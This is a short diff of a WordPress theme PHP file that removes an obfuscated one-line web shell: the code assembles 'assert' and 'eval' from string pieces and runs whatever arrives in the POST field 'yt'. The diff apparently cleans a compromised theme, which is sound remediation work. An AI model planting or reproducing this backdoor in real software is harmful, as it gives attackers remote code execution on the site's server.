@@ -1,6 +1,4 @@
-
 <?php
-$k='a'.'ss'.'er'.'t';$a='e'.'v'.'a'.'l';@$k("$a(\$_POST[yt])");
 
 /** Tell WordPress to run discover_setup() when the 'after_setup_theme' hook is run. */
 add_action( 'after_setup_theme', 'discover_setup' );
